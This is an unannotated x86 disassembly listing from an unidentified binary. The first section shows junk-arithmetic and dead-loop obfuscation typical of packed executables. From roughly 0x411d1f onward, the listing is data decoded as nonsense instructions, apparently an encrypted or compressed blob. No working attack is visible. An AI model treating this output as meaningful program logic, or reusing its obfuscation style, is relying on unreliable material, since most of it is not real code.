  411b38:	mov    eax,DWORD PTR [ebp+0xc]
  411b3b:	xor    eax,ecx
  411b3d:	or     DWORD PTR ds:0x432eab,0x179
  411b47:	push   esi
  411b48:	mov    esi,DWORD PTR [ebp+0x10]
  411b4b:	mov    edx,DWORD PTR ds:0x432ea7
  411b51:	sbb    DWORD PTR ds:0x432eaf,edx
  411b57:	mov    edx,0x3272f6
  411b5c:	xor    DWORD PTR ds:0x432eab,0x432e83
  411b66:	add    eax,edx
  411b68:	or     DWORD PTR ds:0x432e83,0x432e6f
  411b72:	mov    DWORD PTR [esi+0x4],eax
  411b75:	mov    eax,DWORD PTR [ebp+0x14]
  411b78:	movzx  esi,WORD PTR ds:0x432ecf
  411b7f:	sub    DWORD PTR ds:0x432e9b,esi
  411b85:	mov    esi,DWORD PTR [ebp+0x10]
  411b88:	adc    DWORD PTR ds:0x432e5b,0xf72
  411b92:	mov    DWORD PTR [esi+0x8],eax
  411b95:	mov    eax,DWORD PTR [ebp+0x18]
  411b98:	mov    esi,DWORD PTR [ebp+0x10]
  411b9b:	mov    DWORD PTR [esi+0xc],eax
  411b9e:	mov    eax,DWORD PTR [ebp+0x1c]
  411ba1:	mov    esi,DWORD PTR [ebp+0x10]
  411ba4:	mov    DWORD PTR [esi+0x10],eax
  411ba7:	mov    eax,DWORD PTR [ebp+0x8]
  411baa:	xor    eax,ecx
  411bac:	add    eax,edx
  411bae:	pop    esi
  411baf:	leave  
  411bb0:	ret    0x18
  411bb3:	push   ebp
  411bb4:	mov    ebp,esp
  411bb6:	sub    esp,0x9c
  411bbc:	sbb    ecx,0x4d1
  411bc2:	mov    ecx,DWORD PTR [ebp+0x8]
  411bc5:	mov    eax,0x8a9b
  411bca:	xor    ax,WORD PTR [ecx+0x20]
  411bce:	mov    ecx,DWORD PTR ds:0x432ea7
  411bd4:	adc    DWORD PTR ds:0x432e9f,ecx
  411bda:	mov    ecx,0x3b5d
  411bdf:	sub    DWORD PTR ds:0x432eab,0x1476
  411be9:	add    ax,cx
  411bec:	movzx  eax,ax
  411bef:	mov    DWORD PTR ds:0x432e8b,0x1b
  411bf9:	cmp    DWORD PTR ds:0x432e8b,0x0
  411c00:	je     0x411c4c
  411c06:	cmp    DWORD PTR ds:0x432e8b,0x2
  411c0d:	ja     0x411c4c
  411c13:	jmp    0x411c20
  411c18:	push   0x4
  411c1a:	call   DWORD PTR ds:0x43fdeb
  411c20:	cmp    DWORD PTR ds:0x432e8b,0x3
  411c27:	jne    0x411c3a
  411c2d:	mov    ecx,DWORD PTR ds:0x432e8b
  411c33:	dec    ecx
  411c34:	mov    DWORD PTR ds:0x432e8b,ecx
  411c3a:	mov    ecx,DWORD PTR ds:0x432e8b
  411c40:	dec    ecx
  411c41:	mov    DWORD PTR ds:0x432e8b,ecx
  411c47:	jmp    0x411bf9
  411c4c:	mov    DWORD PTR [ebp-0x10],eax
  411c4f:	mov    BYTE PTR [ebp-0x1],0x82
  411c53:	lea    eax,[ebp-0x1]
  411c56:	or     DWORD PTR ds:0x432e33,0x2387
  411c60:	mov    DWORD PTR [ebp-0xc],eax
  411c63:	xor    DWORD PTR ds:0x432e7f,edi
  411c69:	mov    al,BYTE PTR [ebp-0x1]
  411c6c:	mov    ecx,DWORD PTR [ebp-0xc]
  411c6f:	sbb    DWORD PTR ds:0x432ebf,0x63b1
  411c79:	xor    al,0x7f
  411c7b:	sbb    DWORD PTR ds:0x432e43,0x432e93
  411c85:	add    al,0x4
  411c87:	adc    DWORD PTR ds:0x432e5b,0xd9d
  411c91:	mov    BYTE PTR [ecx],al
  411c93:	and    eax,DWORD PTR ds:0x432eaf
  411c99:	mov    DWORD PTR [ebp-0x18],0xf89c85a5
  411ca0:	push   ebx
  411ca1:	mov    ecx,DWORD PTR ds:0x432e57
  411ca7:	add    DWORD PTR ds:0x432e6f,ecx
  411cad:	mov    DWORD PTR [ebp-0x8],0xf89c85a4
  411cb4:	not    eax
  411cb6:	mov    ecx,DWORD PTR [ebp-0x18]
  411cb9:	mov    DWORD PTR ds:0x432ebf,0x1e
  411cc3:	cmp    DWORD PTR ds:0x432ebf,0x0
  411cca:	je     0x4140d3
  411cd0:	cmp    DWORD PTR ds:0x432ebf,0x3
  411cd7:	jg     0x4140d3
  411cdd:	jmp    0x411cf2
  411ce2:	push   0x432e97
  411ce7:	push   0x1953
  411cec:	call   DWORD PTR ds:0x43fdef
  411cf2:	cmp    DWORD PTR ds:0x432ebf,0x4
  411cf9:	jne    0x411d0a
  411cff:	mov    eax,ds:0x432ebf
  411d04:	dec    eax
  411d05:	mov    ds:0x432ebf,eax
  411d0a:	mov    eax,ds:0x432ebf
  411d0f:	dec    eax
  411d10:	mov    ds:0x432ebf,eax
  411d15:	jmp    0x411cc3
  411d1a:	jmp    0x4140d3
  411d1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411d20:	test   al,0xbe
  411d22:	cdq    
  411d23:	mov    esp,0x1c848485
  411d28:	pcmpgtw mm0,QWORD PTR [eax+0x7809ddd7]
  411d2f:	xor    DWORD PTR [ebx+0x60e78383],ecx
  411d35:	add    DWORD PTR [ebx-0x388912e0],0x1d
  411d3c:	cld    
  411d3d:	bound  ebx,QWORD PTR ds:0xeabe369d
  411d43:	fidiv  DWORD PTR [ebx+0x2302debe]
  411d49:	push   eax
  411d4a:	call   0xb33df466
  411d4f:	inc    ebx
  411d50:	inc    ebp
  411d51:	and    al,0x21
  411d53:	fwait
  411d54:	leave  
  411d55:	clc    
  411d56:	test   BYTE PTR [edi+ebp*4],ch
  411d59:	mov    cl,0xc8
  411d5b:	adc    dh,ah
  411d5d:	mov    bh,0x4
  411d5f:	call   0xb44b5c8b
  411d64:	popf   
  411d65:	xor    DWORD PTR [ecx+ecx*2-0xf],0x600fb359
  411d6d:	sbb    DWORD PTR [esi-0x33],ecx
  411d70:	cmp    cl,BYTE PTR [ebx-0x2d]
  411d73:	inc    edx
  411d74:	stos   DWORD PTR es:[edi],eax
  411d75:	xchg   DWORD PTR ss:[ebp+0x541dc2a2],esi
  411d7c:	sub    DWORD PTR [ecx+0x4efe5d8a],eax
  411d82:	ss cmc 
  411d84:	leave  
  411d85:	jo     0x411dc0
  411d87:	jl     0x411d30
  411d89:	aaa    
  411d8a:	mov    al,BYTE PTR [edi+0x12b42caa]
  411d90:	mov    dh,0x4e
  411d92:	imul   eax,ebx,0x66871874
  411d98:	mov    WORD PTR [ecx-0x2456c6f9],?
  411d9e:	adc    eax,eax
  411da0:	aam    0x69
  411da2:	pop    esp
  411da3:	add    DWORD PTR [ebx-0xd],0x14
  411da7:	xchg   BYTE PTR [esi+0x6da0b6d6],al
  411dad:	setbe  BYTE PTR [ecx+0x4a]
  411db1:	aaa    
  411db2:	sub    eax,0x54a165d7
  411db7:	mov    dl,0x6d
  411db9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411dba:	test   al,0xf2
  411dbc:	add    eax,0xadc8c8a8
  411dc1:	push   0xffffffd8
  411dc3:	repnz pop ebp
  411dc5:	cmp    dh,cl
  411dc7:	cmp    ebp,DWORD PTR [edx-0x3af2a9a]
  411dcd:	fsubr  QWORD PTR [ebx-0x6e8b1640]
  411dd3:	(bad)  
  411dd4:	mov    esi,DWORD PTR [ebx+0x6a]
  411dd7:	leave  
  411dd8:	mov    esi,0x84926f2e
  411ddd:	add    dl,ch
  411ddf:	xor    dl,BYTE PTR [ecx-0x4b9190fe]
  411de5:	pop    ebp
  411de6:	push   edi
  411de7:	lahf   
  411de8:	pop    ecx
  411de9:	add    al,0x3d
  411deb:	pop    ebx
  411dec:	or     al,0x13
  411dee:	scas   eax,DWORD PTR es:[edi]
  411def:	or     BYTE PTR [eax+0x1e],bh
  411df2:	xchg   edx,eax
  411df3:	jb     0x411e22
  411df5:	xor    eax,0xabc4cfea
  411dfa:	xchg   ebx,eax
  411dfb:	fs out 0x38,al
  411dfe:	popf   
  411dff:	jle    0x411ddb
  411e01:	mov    dl,0xf3
  411e03:	push   ebp
  411e04:	jle    0x411ded
  411e06:	js     0x411d8d
  411e08:	mov    DWORD PTR [edx+0x10],esp
  411e0b:	shr    dl,cl
  411e0d:	mov    edx,0x2faf49a7
  411e12:	fwait
  411e13:	push   ebp
  411e14:	push   es
  411e15:	cmp    esp,ebp
  411e17:	or     BYTE PTR [edi],dl
  411e19:	xchg   DWORD PTR ss:[ebx-0x58f30f29],eax
  411e20:	push   eax
  411e21:	mov    edi,DWORD PTR [ebx+ebp*8+0x75]
  411e25:	pop    edi
  411e26:	cmp    cl,0xb9
  411e29:	xchg   ebp,edi
  411e2b:	xor    eax,0x28cb8527
  411e30:	mov    edx,0xdfd21039
  411e35:	fstp   QWORD PTR [eax+0x41e827bf]
  411e3b:	dec    edi
  411e3c:	jns    0x411e35
  411e3e:	retf   0x107a
  411e41:	sbb    BYTE PTR [eax-0x3b534d35],ah
  411e47:	rol    al,cl
  411e49:	mov    WORD PTR [esi-0x5d],ds
  411e4c:	xchg   esp,eax
  411e4d:	jbe    0x411dd0
  411e4f:	fcom   DWORD PTR [ebp-0x8]
  411e52:	rol    BYTE PTR [ebp-0x3b],1
  411e55:	dec    eax
  411e56:	add    DWORD PTR [eax],eax
  411e58:	push   eax
  411e59:	repnz test ah,dh
  411e5c:	sub    ch,BYTE PTR [ecx+0x5c]
  411e5f:	mov    ds:0xc0511287,al
  411e64:	cdq    
  411e65:	out    0xc8,al
  411e67:	mov    ah,0x34
  411e69:	(bad)  
  411e6a:	adc    al,0xcb
  411e6c:	scas   al,BYTE PTR es:[edi]
  411e6d:	dec    edx
  411e6e:	mov    bl,0x7a
  411e70:	ret    
  411e71:	jg     0x411e90
  411e73:	mov    ebx,0xa0076866
  411e78:	pop    eax
  411e79:	inc    esi
  411e7a:	mov    BYTE PTR [eax+eiz*1],dl
  411e7d:	repnz or bh,dh
  411e80:	in     eax,dx
  411e81:	cmp    eax,0x4f93c9e1
  411e86:	pop    edx
  411e87:	ja     0x411eab
  411e89:	je     0x411f09
  411e8b:	or     eax,0x1f37fa95
  411e90:	iret   
  411e91:	push   esi
  411e92:	push   ecx
  411e93:	cmp    al,0xfa
  411e95:	into   
  411e96:	or     eax,0xe1917b03
  411e9b:	or     ebp,DWORD PTR [ebx-0x657115de]
  411ea1:	jge    0x411ea7
  411ea3:	sub    eax,0x8aebf894
  411ea8:	inc    ebp
  411ea9:	ret    0xb7c8
  411eac:	and    ch,dl
  411eae:	add    eax,0xc4d8aff9
  411eb3:	jmp    0xdc4a:0x130bca10
  411eba:	into   
  411ebb:	(bad)  
  411ebd:	xor    eax,0x6d016918
  411ec2:	dec    edi
  411ec3:	adc    DWORD PTR [esi],ebx
  411ec5:	aas    
  411ec6:	sub    bl,al
  411ec8:	xlat   BYTE PTR ds:[ebx]
  411ec9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411eca:	jnp    0x411f13
  411ecc:	mov    fs,WORD PTR [ecx+0x20]
  411ecf:	mov    al,ds:0x88873679
  411ed4:	mov    cl,ch
  411ed6:	xchg   ecx,eax
  411ed7:	add    DWORD PTR [edx],ebx
  411ed9:	sbb    edi,DWORD PTR [edi]
  411edb:	mov    ?,WORD PTR [edx+ebx*1]
  411ede:	jmp    0x411ee2
  411ee0:	adc    DWORD PTR [esi],ebx
  411ee2:	push   esi
  411ee3:	mov    esi,0xf7e48da1
  411ee8:	add    eax,0xe21d6e16
  411eed:	cmp    ebp,0x3fd43b72
  411ef3:	push   edx
  411ef4:	jecxz  0x411eb9
  411ef6:	js     0x411edd
  411ef8:	add    esi,DWORD PTR [eax+0x60de00e3]
  411efe:	lods   al,BYTE PTR ds:[esi]
  411eff:	aam    0x73
  411f01:	jbe    0x411e99
  411f03:	adc    cl,0x91
  411f06:	add    ch,al
  411f08:	xchg   edi,eax
  411f09:	pushf  
  411f0a:	pop    esi
  411f0b:	pop    DWORD PTR [edi-0x7d]
  411f0e:	jns    0x411edf
  411f10:	in     al,0x30
  411f12:	mov    edx,0x8982f74e
  411f17:	xchg   esp,eax
  411f18:	dec    ebx
  411f19:	push   ebp
  411f1a:	mov    dl,BYTE PTR [esi]
  411f1c:	cld    
  411f1d:	enter  0xb2e9,0xc2
  411f21:	or     al,BYTE PTR [eax+0x3c]
  411f24:	inc    ebp
  411f25:	jno    0x411f68
  411f27:	jmp    0xa073:0x9a00abbe
  411f2e:	mov    ecx,0x72183d7
  411f33:	arpl   WORD PTR [edx-0x416af179],sp
  411f39:	fwait
  411f3a:	xchg   DWORD PTR [esi+0x47],esp
  411f3d:	outs   dx,BYTE PTR ds:[esi]
  411f3e:	inc    ebx
  411f3f:	pop    eax
  411f40:	les    edi,FWORD PTR [esi-0x3014f3ca]
  411f46:	and    bl,0xda
  411f49:	jecxz  0x411f7b
  411f4b:	dec    ebx
  411f4c:	jg     0x411f66
  411f4e:	mov    dl,0xcc
  411f50:	push   ebx
  411f51:	dec    esp
  411f52:	push   ebp
  411f53:	ror    DWORD PTR [edi-0x795b58bc],1
  411f59:	pop    esi
  411f5a:	test   eax,0x7a4ae2ff
  411f5f:	fild   DWORD PTR [eax-0x7e]
  411f62:	mov    edx,edx
  411f64:	loop   0x411f8b
  411f66:	push   ebx
  411f67:	js     0x411fa6
  411f69:	mov    bl,0x3c
  411f6b:	jmp    0xad1939a
  411f70:	in     al,dx
  411f71:	aaa    
  411f72:	ret    
  411f73:	lahf   
  411f74:	stos   BYTE PTR es:[edi],al
  411f75:	push   ebp
  411f76:	cs pop ss
  411f78:	jne    0x411f44
  411f7a:	mov    ah,0x7b
  411f7c:	jmp    0x411f30
  411f7e:	int3   
  411f7f:	clc    
  411f80:	in     al,dx
  411f81:	stc    
  411f82:	mov    ebp,0x6a37e8cb
  411f87:	xchg   ecx,eax
  411f88:	push   ebp
  411f89:	call   DWORD PTR [ebx+0x7a903676]
  411f8f:	les    ecx,FWORD PTR [edx-0x22]
  411f92:	adc    ax,0xf4af
  411f96:	sub    ch,BYTE PTR [ebp-0x67914178]
  411f9c:	lods   eax,DWORD PTR ds:[esi]
  411f9d:	and    edx,edx
  411f9f:	test   BYTE PTR [esi],al
  411fa1:	push   esi
  411fa2:	mov    bl,0x73
  411fa4:	and    DWORD PTR [ebx-0x4dfdf6b7],eax
  411faa:	btc    DWORD PTR [ebx],ebp
  411fad:	test   eax,0xbcb6a558
  411fb2:	pop    ebx
  411fb3:	fst    QWORD PTR [edi]
  411fb5:	out    0x67,al
  411fb7:	(bad)  
  411fb8:	in     al,dx
  411fb9:	jae    0x411f41
  411fbb:	xchg   esi,eax
  411fbc:	scas   al,BYTE PTR es:[edi]
  411fbd:	mov    al,0x60
  411fbf:	out    dx,al
  411fc0:	call   0xe2c3:0x44e49934
  411fc7:	lea    ecx,[edi]
  411fc9:	fisttp DWORD PTR [edx]
  411fcb:	pop    edx
  411fcc:	outs   dx,DWORD PTR ds:[esi]
  411fcd:	push   edx
  411fce:	mov    dh,0x11
  411fd0:	leave  
  411fd1:	push   ecx
  411fd2:	push   es
  411fd3:	aad    0x64
  411fd5:	test   DWORD PTR [edi],eax
  411fd7:	cmp    bl,BYTE PTR [ecx+0xfc6ce15]
  411fdd:	test   DWORD PTR [edx+0x7],esp
  411fe0:	adc    DWORD PTR [edi-0x31],esp
  411fe3:	push   edx
  411fe4:	jbe    0x412024
  411fe6:	and    al,0x42
  411fe8:	mov    edi,DWORD PTR [ebx+0x38babfb2]
  411fee:	and    BYTE PTR [ebx+0x8],0x2b
  411ff2:	fs inc ecx
  411ff4:	outs   dx,DWORD PTR ds:[esi]
  411ff5:	fsubr  st,st(3)
  411ff7:	pop    esi
  411ff8:	xchg   dh,dl
  411ffa:	mov    fs,WORD PTR [eax-0x4f]
  411ffd:	cmp    dh,BYTE PTR [edi+0x3e6a6a2a]
  412003:	test   al,0xcf
  412005:	cmp    ebx,eax
  412007:	(bad)  
  412008:	jmp    0x13bc9468
  41200d:	call   0x7cef9da5
  412012:	sub    ch,BYTE PTR [edx-0xce1362b]
  412018:	sahf   
  412019:	push   ds
  41201a:	xchg   esp,eax
  41201b:	fcomp  QWORD PTR [esi+0x47f739b9]
  412021:	addr16 sbb al,0xfd
  412024:	loop   0x411fcf
  412026:	leave  
  412027:	out    dx,eax
  412028:	int    0x41
  41202a:	xchg   esp,eax
  41202b:	lods   eax,DWORD PTR ds:[esi]
  41202c:	sub    ah,dh
  41202e:	scas   al,BYTE PTR es:[edi]
  41202f:	pop    edi
  412030:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412031:	das    
  412032:	lock cmovle ebp,DWORD PTR fs:[esi-0x25d765b7]
  41203b:	test   al,0x52
  41203d:	loop   0x41200c
  41203f:	cwde   
  412040:	ds push edi
  412042:	std    
  412043:	leave  
  412044:	push   cs
  412045:	in     eax,0x6
  412047:	iret   
  412048:	cld    
  412049:	pusha  
  41204a:	sbb    dh,BYTE PTR [edx-0x2c4a6044]
  412050:	cmp    ebx,0xfb9053ea
  412056:	jge    0x412020
  412058:	xchg   ebx,eax
  412059:	outs   dx,BYTE PTR ds:[esi]
  41205a:	or     edx,eax
  41205c:	mov    ds:0xc21abdc7,eax
  412061:	sbb    ecx,DWORD PTR [edx+0x67aa5cfb]
  412067:	pusha  
  412068:	push   ss
  412069:	push   edx
  41206a:	cmp    eax,0x74041d77
  41206f:	mov    DWORD PTR [ebp-0x761a78e6],ebx
  412075:	pop    ss
  412076:	fwait
  412077:	mul    BYTE PTR [esi]
  412079:	sub    DWORD PTR [edx+0x25],ecx
  41207c:	add    al,0xad
  41207e:	out    dx,al
  41207f:	(bad)  
  412080:	and    al,0xcf
  412082:	xor    DWORD PTR [edx-0xd3a0536],edx
  412088:	ret    0xa5ca
  41208b:	and    DWORD PTR [edx-0x32],esp
  41208e:	sti    
  41208f:	push   es
  412090:	in     al,dx
  412091:	aam    0x4e
  412093:	xchg   edx,eax
  412094:	stos   BYTE PTR es:[edi],al
  412095:	test   al,0x87
  412097:	jmp    0x340e3934
  41209c:	dec    esi
  41209d:	jb     0x412089
  41209f:	or     BYTE PTR [eax+0x62],cl
  4120a2:	ss sbb ah,dl
  4120a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4120a6:	pushw  ss
  4120a8:	inc    eax
  4120a9:	inc    eax
  4120aa:	add    edi,esi
  4120ac:	pop    edi
  4120ad:	mov    cl,0xef
  4120af:	fisttp QWORD PTR [eax+ebx*1+0x4e]
  4120b3:	xchg   edx,eax
  4120b4:	(bad)  
  4120b5:	cld    
  4120b6:	das    
  4120b7:	mov    edx,0xdf174166
  4120bc:	sbb    al,0xd0
  4120be:	retf   0x7785
  4120c1:	das    
  4120c2:	sti    
  4120c3:	adc    BYTE PTR [edx],cl
  4120c5:	jo     0x4120ea
  4120c7:	jae    0x412087
  4120c9:	ss (bad) 
  4120cb:	xor    DWORD PTR [esi-0x55],esp
  4120ce:	or     BYTE PTR [eax-0x70],al
  4120d1:	ror    BYTE PTR [esi+0x11],1
  4120d4:	pop    esi
  4120d5:	push   cs
  4120d6:	cdq    
  4120d7:	push   esp
  4120d8:	cmp    BYTE PTR [ecx+0x37],dh
  4120db:	xor    BYTE PTR [edx-0x64b278e8],ch
  4120e1:	sti    
  4120e2:	or     BYTE PTR [ecx],al
  4120e4:	(bad)  
  4120e5:	in     al,0x6e
  4120e7:	pop    ebp
  4120e8:	leave  
  4120e9:	aas    
  4120ea:	pop    eax
  4120eb:	mov    ebx,0xfa34a963
  4120f0:	adc    al,0x2c
  4120f2:	mov    al,0x59
  4120f4:	shl    DWORD PTR [eax-0xcfc1cad],cl
  4120fa:	in     eax,dx
  4120fb:	mov    eax,ds:0x2f138a7a
  412100:	in     al,0xe1
  412102:	push   ss
  412103:	out    0xd2,eax
  412105:	in     al,0xac
  412107:	push   eax
  412108:	ja     0x4120ca
  41210a:	data16 aas 
  41210c:	inc    edi
  41210d:	in     eax,0x2
  41210f:	loop   0x412160
  412111:	cli    
  412112:	neg    DWORD PTR [ecx-0x3dd03448]
  412118:	sub    eax,0x82a439e1
  41211d:	add    esi,DWORD PTR [ecx+0x52]
  412120:	sbb    al,0x30
  412122:	mov    ds:0x2e2c6ec6,al
  412127:	lods   eax,DWORD PTR ds:[esi]
  412128:	jb     0x412163
  41212a:	jg     0x412147
  41212c:	jbe    0x41211c
  41212e:	push   ss
  41212f:	sub    eax,0x1f3dca95
  412134:	jmp    0x412113
  412136:	scas   al,BYTE PTR es:[edi]
  412137:	pushf  
  412138:	fadd   QWORD PTR [ecx+0x392b3f23]
  41213e:	or     dh,BYTE PTR [ecx-0x65b36af3]
  412144:	mov    ch,0x2c
  412146:	jno    0x41217f
  412148:	retf   0x2d1
  41214b:	lock sar DWORD PTR [eax],1
  41214e:	(bad)  [edi]
  412150:	ds jae 0x41214e
  412153:	push   edx
  412154:	inc    ebx
  412155:	pop    esi
  412156:	dec    esi
  412157:	inc    edi
  412158:	shl    BYTE PTR [edi-0x6834818b],1
  41215e:	xchg   ebp,eax
  41215f:	jns    0x41214c
  412161:	push   ebp
  412162:	adc    al,ch
  412164:	xchg   esp,eax
  412165:	es mov edx,0x6542e60a
  41216b:	inc    ebx
  41216c:	sub    ebx,DWORD PTR [ebx-0x478f9b1e]
  412172:	push   edx
  412173:	xchg   ebp,esi
  412175:	stc    
  412176:	pop    ecx
  412177:	les    edx,FWORD PTR [esi]
  412179:	lea    esp,[edx+ebx*2-0x36611353]
  412180:	imul   ebx,DWORD PTR [ecx+edx*1+0x7a],0xed68bedc
  412188:	adc    al,0xce
  41218a:	shr    DWORD PTR [eax+0x2c35aaf4],0xfd
  412191:	(bad)  
  412192:	push   edi
  412193:	cmp    esp,DWORD PTR [eax-0x20d8f4f8]
  412199:	xchg   ebx,eax
  41219a:	xor    eax,0xe8230137
  41219f:	repnz pop ebx
  4121a1:	sub    DWORD PTR [edi+0x218b0c40],edi
  4121a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4121a8:	lods   eax,DWORD PTR ds:[esi]
  4121a9:	int    0xcd
  4121ab:	mov    edx,0xcf02c150
  4121b0:	mov    al,0xe3
  4121b2:	adc    BYTE PTR [ebp-0x47],ah
  4121b5:	jmp    0x41219f
  4121b7:	fld    DWORD PTR [esi]
  4121b9:	cmp    DWORD PTR [eax+0x61],ebp
  4121bc:	fisub  WORD PTR [eax+ebp*2-0x63be4c62]
  4121c3:	jl     0x4121d2
  4121c5:	in     eax,dx
  4121c6:	mov    bh,0xbc
  4121c8:	addr16 pop ds
  4121ca:	push   esp
  4121cb:	inc    esp
  4121cc:	call   0xf784:0xc5ead5d
  4121d3:	fwait
  4121d4:	js     0x412253
  4121d6:	or     DWORD PTR ds:0xf82e8d4d,ecx
  4121dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4121dd:	test   al,0xae
  4121df:	jmp    0xea14db93
  4121e4:	sbb    DWORD PTR [esi],0x6f16f5bd
  4121ea:	mov    eax,ds:0xf4c23bec
  4121ef:	sub    dl,dh
  4121f1:	push   eax
  4121f2:	sti    
  4121f3:	pushf  
  4121f4:	ss aam 0xe0
  4121f7:	scas   al,BYTE PTR es:[edi]
  4121f8:	fisub  WORD PTR ds:0x7a051864
  4121fe:	(bad)  
  4121ff:	out    dx,al
  412200:	lea    edi,[ebx+0x5eab0af]
  412206:	pop    eax
  412207:	xlat   BYTE PTR ds:[ebx]
  412208:	fdiv   DWORD PTR [edx-0x1396b73e]
  41220e:	pop    edi
  41220f:	fld    QWORD PTR [eax]
  412211:	or     bh,ah
  412213:	xchg   BYTE PTR [esi+0x33],ch
  412216:	lods   eax,DWORD PTR ds:[esi]
  412217:	sbb    DWORD PTR [esi+0x36548d38],ebp
  41221d:	dec    ebp
  41221e:	sar    BYTE PTR [eax+0x3e8cf716],0x80
  412225:	mov    ch,0xf
  412227:	ss (bad) 
  412229:	adc    dh,BYTE PTR [ebp+0x542a41ba]
  41222f:	nop
  412230:	scas   eax,DWORD PTR es:[edi]
  412231:	pop    ecx
  412232:	xlat   BYTE PTR ds:[ebx]
  412233:	lods   eax,DWORD PTR ds:[esi]
  412234:	mov    ebp,0x1b56c00a
  412239:	jecxz  0x412280
  41223b:	adc    bh,BYTE PTR [eax-0x16d8141d]
  412241:	jne    0x41228b
  412243:	popa   
  412244:	adc    ah,BYTE PTR [esi+0x3e]
  412247:	popa   
  412248:	pop    esi
  412249:	sub    BYTE PTR [edx],ch
  41224b:	out    0xc4,eax
  41224d:	sub    esp,ebp
  41224f:	mov    DWORD PTR [edi-0x378b3542],eax
  412255:	fcmovb st,st(2)
  412257:	scas   eax,DWORD PTR es:[edi]
  412258:	ror    edx,cl
  41225a:	rcl    DWORD PTR [esi+ebx*2+0x72],cl
  41225e:	jp     0x412202
  412260:	jmp    DWORD PTR [ecx+0x37]
  412263:	jb     0x412200
  412265:	xor    al,0x42
  412267:	push   eax
  412268:	ja     0x412275
  41226a:	inc    ebp
  41226b:	or     eax,eax
  41226d:	imul   eax,DWORD PTR [ebp-0x20],0xffffffb7
  412271:	out    dx,al
  412272:	xlat   BYTE PTR ds:[ebx]
  412273:	in     al,dx
  412274:	add    DWORD PTR [ecx-0xd],eax
  412277:	loopne 0x41225e
  412279:	daa    
  41227a:	mov    esi,0x87ca78cf
  41227f:	stos   DWORD PTR es:[edi],eax
  412280:	loope  0x41229a
  412282:	mov    dh,0x1a
  412284:	test   al,0xc6
  412286:	in     eax,0xb0
  412288:	pop    esi
  412289:	add    eax,0x19e46dd5
  41228e:	and    BYTE PTR [edi-0x48],cl
  412291:	cmp    eax,0x8dc7d6f9
  412296:	mov    edi,0x8ae50cb1
  41229b:	pop    ds
  41229c:	mov    ebx,0xca5ec5fe
  4122a1:	into   
  4122a2:	jecxz  0x4122b7
  4122a4:	leave  
  4122a5:	loop   0x412324
  4122a7:	mov    cl,ch
  4122a9:	popa   
  4122aa:	(bad)  
  4122ab:	cmp    eax,0x6a517cf7
  4122b0:	aam    0x68
  4122b2:	pop    ds
  4122b3:	sbb    al,BYTE PTR [edi-0x12]
  4122b6:	mov    ds:0x2baed273,al
  4122bb:	sub    ah,BYTE PTR [eax+0x22]
  4122be:	sub    dh,BYTE PTR [ebp+0x6d3f8fdc]
  4122c4:	nop
  4122c5:	aad    0xed
  4122c7:	mov    BYTE PTR [ebp-0x5f],bl
  4122ca:	push   es
  4122cb:	mov    bh,0xe4
  4122cd:	in     al,0xdf
  4122cf:	sti    
  4122d0:	and    ecx,0xffffffbc
  4122d3:	cwde   
  4122d4:	mov    ecx,0xf8aafc72
  4122d9:	scas   eax,DWORD PTR es:[edi]
  4122da:	cli    
  4122db:	pusha  
  4122dc:	sbb    al,0x46
  4122de:	mov    ecx,ebx
  4122e0:	adc    DWORD PTR [ebp-0x1fc3a38e],ebp
  4122e6:	mov    ecx,0x8cf3a17f
  4122eb:	or     eax,0x6d57dcb6
  4122f0:	mov    ch,0x1f
  4122f2:	aad    0x6d
  4122f4:	add    BYTE PTR [esi+0x4],dl
  4122f7:	loope  0x4122f9
  4122f9:	pop    es
  4122fa:	cmp    ah,cl
  4122fc:	leave  
  4122fd:	jmp    0xbe0:0xafbeaba8
  412304:	js     0x41235b
  412306:	pop    es
  412307:	xchg   BYTE PTR [ecx+0x7643f50],bl
  41230d:	cmp    esp,DWORD PTR ds:0xb9fdcda0
  412313:	jmp    0xb7c707c6
  412318:	pop    edx
  412319:	ret    
  41231a:	push   ecx
  41231b:	xor    BYTE PTR [eax-0x5e130679],bl
  412321:	lods   eax,DWORD PTR ds:[esi]
  412322:	pop    ss
  412323:	push   ebp
  412324:	sub    al,0xad
  412326:	sub    BYTE PTR [edx*8-0x91bdbe0],bl
  41232d:	jne    0x41237e
  41232f:	or     eax,0x1846291f
  412334:	in     eax,dx
  412335:	ss inc ebp
  412337:	fimul  DWORD PTR [ecx-0x1c04f08e]
  41233d:	xchg   BYTE PTR [ebx+0x6549c2a3],ch
  412343:	mov    eax,0xee064f1b
  412348:	sahf   
  412349:	mov    al,0xe1
  41234b:	out    0xf9,eax
  41234d:	loope  0x412313
  41234f:	outs   dx,BYTE PTR ds:[esi]
  412350:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412351:	pop    ecx
  412352:	adc    BYTE PTR [eiz*1+0x7890b44],al
  412359:	push   0xffffff92
  41235b:	add    edi,ecx
  41235d:	mov    DWORD PTR [eax-0x1a21b7fe],ebp
  412363:	mov    ecx,0x21e99489
  412368:	jp     0x4123e8
  41236a:	fimul  DWORD PTR [ecx]
  41236c:	adc    al,0xd7
  41236e:	mov    ds:0x790ff2b9,al
  412373:	sub    dl,BYTE PTR [ebx+0x1ebfec9e]
  412379:	push   edx
  41237a:	test   BYTE PTR [ecx],cl
  41237c:	mov    al,ds:0x56331e72
  412381:	fistp  DWORD PTR [ecx-0x3a]
  412384:	mov    ?,edx
  412386:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412387:	retf   
  412388:	mov    bl,0x83
  41238a:	push   esi
  41238b:	ret    
  41238c:	mov    ah,bh
  41238e:	or     ebp,DWORD PTR [edi+0x1d]
  412391:	cmp    cl,BYTE PTR [eax+0x5d]
  412394:	out    dx,al
  412395:	mov    ch,bl
  412397:	(bad)  
  412399:	xchg   DWORD PTR [ecx],edi
  41239b:	mov    dl,0x49
  41239d:	mov    edi,0x57343309
  4123a2:	daa    
  4123a3:	ins    DWORD PTR es:[edi],dx
  4123a4:	inc    edi
  4123a5:	fcmovbe st,st(0)
  4123a7:	stos   BYTE PTR es:[edi],al
  4123a8:	add    bh,dh
  4123aa:	pop    es
  4123ab:	sbb    al,0xb4
  4123ad:	cdq    
  4123ae:	lahf   
  4123af:	cmp    eax,0x8ce8e09f
  4123b4:	push   ss
